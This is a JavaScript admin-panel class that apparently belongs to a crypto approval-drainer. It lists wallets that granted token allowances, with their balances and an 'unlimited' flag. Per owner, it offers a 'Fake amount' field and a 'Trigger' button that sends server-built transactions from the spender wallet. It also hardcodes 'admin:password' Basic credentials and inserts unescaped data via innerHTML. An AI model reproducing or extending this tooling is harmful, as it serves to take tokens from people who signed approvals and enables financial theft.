class AdminPanel {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.spenderOwner = null;
        this.initializeElements();
        this.attachEventListeners();
        this.refreshData();
    }

    initializeElements() {
        this.connectWalletBtn = document.getElementById('connectWallet');
        this.walletStatus = document.getElementById('walletStatus');
        this.refreshDataBtn = document.getElementById('refreshData');
        this.loadingIndicator = document.getElementById('loading');
        this.approvalsTable = document.getElementById('approvalsTable').querySelector('tbody');
    }

    attachEventListeners() {
        this.connectWalletBtn.addEventListener('click', () => this.connectWallet());
        this.refreshDataBtn.addEventListener('click', () => this.refreshData());
    }

    async connectWallet() {
        if (typeof window.ethereum === 'undefined') {
            alert('MetaMask is not installed!');
            return;
        }

        try {
            this.provider = new ethers.providers.Web3Provider(window.ethereum);
            await this.provider.send("eth_requestAccounts", []);
            this.signer = this.provider.getSigner();
            const address = await this.signer.getAddress();
            
            this.walletStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
            this.connectWalletBtn.disabled = true;
            
            // Get spender owner to verify permissions
            await this.getSpenderOwner();
        } catch (error) {
            console.error('Error connecting wallet:', error);
            alert('Failed to connect wallet');
        }
    }

    async getSpenderOwner() {
        try {
            const response = await fetch('/api/spender-owner', {
                headers: {
                    'Authorization': 'Basic ' + btoa('admin:password')
                }
            });
            const data = await response.json();
            this.spenderOwner = data.owner;
            
            const signerAddress = await this.signer.getAddress();
            if (signerAddress.toLowerCase() !== this.spenderOwner.toLowerCase()) {
                alert('Connected wallet is not the spender owner! Trigger functionality will be disabled.');
            }
        } catch (error) {
            console.error('Error getting spender owner:', error);
        }
    }

    async refreshData() {
        this.showLoading(true);
        
        try {
            const response = await fetch('/api/approvals', {
                headers: {
                    'Authorization': 'Basic ' + btoa('admin:password')
                }
            });
            
            if (!response.ok) {
                throw new Error('Failed to fetch approvals');
            }
            
            const approvals = await response.json();
            this.renderApprovals(approvals);
        } catch (error) {
            console.error('Error fetching approvals:', error);
            alert('Failed to load approvals data');
        } finally {
            this.showLoading(false);
        }
    }

    renderApprovals(approvals) {
        this.approvalsTable.innerHTML = '';
        
        if (approvals.length === 0) {
            const row = document.createElement('tr');
            row.innerHTML = '<td colspan="9" style="text-align: center;">No approvals found</td>';
            this.approvalsTable.appendChild(row);
            return;
        }
        
        approvals.forEach(approval => {
            const row = document.createElement('tr');
            if (approval.processed) {
                row.classList.add('processed');
            }
            
            const detectedAt = new Date(approval.detectedAt).toLocaleString();
            const confirmedAt = approval.confirmedAt ? new Date(approval.confirmedAt).toLocaleString() : 'Pending';
            
            row.innerHTML = `
                <td class="address">${approval.owner}</td>
                <td class="amount">${approval.allowanceHuman || 'N/A'}</td>
                <td class="amount">${approval.balanceHuman || 'N/A'}</td>
                <td class="${approval.unlimitedFlag ? 'unlimited' : ''}">${approval.unlimitedFlag ? 'YES' : 'NO'}</td>
                <td class="${approval.willCover ? 'will-cover' : ''}">${approval.willCover ? 'YES' : 'NO'}</td>
                <td><a href="https://etherscan.io/tx/${approval.txHash}" target="_blank">${approval.txHash.substring(0, 10)}...</a></td>
                <td>${detectedAt}</td>
                <td>${confirmedAt}</td>
                <td class="action-cell">
                    ${!approval.processed ? `
                        <input type="number" step="any" class="fake-amount-input" placeholder="Fake amount" id="fakeAmount-${approval.txHash}">
                        <button class="trigger-btn" data-txhash="${approval.txHash}" data-owner="${approval.owner}">Trigger</button>
                        <button class="mark-btn" data-txhash="${approval.txHash}">Mark Processed</button>
                    ` : 'Processed'}
                </td>
            `;
            
            this.approvalsTable.appendChild(row);
        });
        
        // Attach event listeners to new buttons
        document.querySelectorAll('.trigger-btn').forEach(btn => {
            btn.addEventListener('click', (e) => this.triggerAction(e));
        });
        
        document.querySelectorAll('.mark-btn').forEach(btn => {
            btn.addEventListener('click', (e) => this.markProcessed(e));
        });
    }

    async triggerAction(event) {
        if (!this.signer) {
            alert('Please connect your wallet first');
            return;
        }
        
        const txHash = event.target.dataset.txhash;
        const owner = event.target.dataset.owner;
        const fakeAmountInput = document.getElementById(`fakeAmount-${txHash}`);
        const fakeAmount = fakeAmountInput.value;
        
        if (!fakeAmount) {
            alert('Please enter a fake amount');
            return;
        }
        
        try {
            // Get transaction data from server
            const response = await fetch('/api/trigger-transaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Basic ' + btoa('admin:password')
                },
                body: JSON.stringify({ owner, fakeAmount })
            });
            
            if (!response.ok) {
                throw new Error('Failed to create transaction');
            }
            
            const txData = await response.json();
            
            // Send transaction via MetaMask
            const txResponse = await this.signer.sendTransaction(txData);
            console.log('Transaction sent:', txResponse.hash);
            
            // Wait for confirmation
            await txResponse.wait();
            console.log('Transaction confirmed');
            
            // Mark as processed
            await this.markAsProcessed(txHash);
            
            alert('Transaction successful!');
            this.refreshData();
        } catch (error) {
            console.error('Error triggering action:', error);
            alert('Transaction failed: ' + error.message);
        }
    }

    async markProcessed(event) {
        const txHash = event.target.dataset.txhash;
        await this.markAsProcessed(txHash);
        this.refreshData();
    }

    async markAsProcessed(txHash) {
        try {
            const response = await fetch('/api/mark-processed', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Basic ' + btoa('admin:password')
                },
                body: JSON.stringify({ txHash })
            });
            
            if (!response.ok) {
                throw new Error('Failed to mark as processed');
            }
            
            console.log('Marked as processed:', txHash);
        } catch (error) {
            console.error('Error marking as processed:', error);
            alert('Failed to mark as processed');
        }
    }

    showLoading(show) {
        if (show) {
            this.loadingIndicator.classList.remove('hidden');
            this.refreshDataBtn.disabled = true;
        } else {
            this.loadingIndicator.classList.add('hidden');
            this.refreshDataBtn.disabled = false;
        }
    }
}

// Initialize the admin panel when the page loads
document.addEventListener('DOMContentLoaded', () => {
    new AdminPanel();
});
